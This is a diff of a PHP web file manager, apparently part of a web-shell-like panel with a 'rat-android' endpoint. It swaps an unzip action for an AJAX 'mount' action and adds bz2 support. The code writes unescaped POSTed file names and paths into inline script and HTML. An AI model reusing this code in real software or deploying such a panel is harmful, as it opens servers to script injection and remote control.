@@ -3,7 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-$version = "v2.8";
+$version = "v2.9";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -1358,16 +1358,37 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                 echo "<font color='red'>gagal pack folder</font>";
             }
         
-        }elseif($_POST['opt'] == 'extrak') {
-            $zipper = new FM_Zipper();
-            $zipsource = $path."/".$_POST['name'];
-            $res = $zipper->unzip($zipsource, $path);
-            if ($res) {
-                echo "<script>alert('Extrak sukses');</script>";
-                echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
-            }else{
-                echo "<font color='red'>Gagal extrak archive</font>";
+        }elseif($_POST['opt'] == 'mount') {
+            $arsource = $path."/".$_POST['name'];
+
+            echo '
+            <script>
+            var name = "'.$arsource.'";
+            var xhr = new XMLHttpRequest();
+            var encname = encodeURIComponent(name).replace("%20","+");
+            var url = "ajax-server.php?idexl=mount_ar:"+encname;
+            
+            xhr.onloadstart = function () {
+                document.title = "Mounting...";
             }
+
+            xhr.onreadystatechange = function() {
+                if (this.responseText !== "" && this.readyState == 4) 
+                {
+                    document.title = "Mounting success";
+                    var data = JSON.parse(this.responseText);
+                    //alert(data.status);
+
+                    window.open(
+                        location.href = "/ai-web/ai.php?path=/var/www/html/ai-web/mount",
+                        "_blank"
+                        );
+                }
+            };
+            xhr.open("GET", url, true);
+            xhr.send();
+            </script>
+            ';
         }elseif($_POST['opt'] == 'open_image') {
             $image = $path."/".$_POST['name'];
             echo '<script>procOpenImage("'.$image.'");</script>';
@@ -1497,7 +1518,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             //show file
             $mime = strtolower(pathinfo($path.'/'.$file, PATHINFO_EXTENSION));
 
-            if ($mime == "zip" || $mime == "tar" || $mime == "gz" || $mime == "rar" || $mime == "xz" || $mime == "7z" || $mime == "apk")
+            if ($mime == "zip" || $mime == "tar" || $mime == "gz" || $mime == "rar" || $mime == "xz" || $mime == "7z" || $mime == "apk" || $mime == "bz2")
                 $icon = "<img src='icon/compress.gif'></img>&nbsp";
             elseif ($mime == "png" || $mime == "jpg" || $mime == "jpeg" || $mime == "gif" || $mime == "ico")
                 $icon = "<img src='icon/image.gif'></img>&nbsp";
@@ -1533,12 +1554,12 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
             
             $mime = strtolower(pathinfo($path.'/'.$file, PATHINFO_EXTENSION));
-            if ($mime == "zip" || $mime == "tar" || $mime == "rar") {
+            if ($mime == "zip" || $mime == "tar" || $mime == "gz" || $mime == "rar" || $mime == "xz" || $mime == "7z" || $mime == "apk" || $mime == "bz2") {
                 echo '</center></td>
                 <td><center><form method="POST" action="?option&path='.$path.'">
                 <select name="opt">
                 <option value="">Select</option>
-                <option value="extrak">Extrak</option>
+                <option value="mount">Mount</option>
                 <option value="delete">Delete</option>
                 <option value="chmod">Chmod</option>
                 <option value="rename">Rename</option>
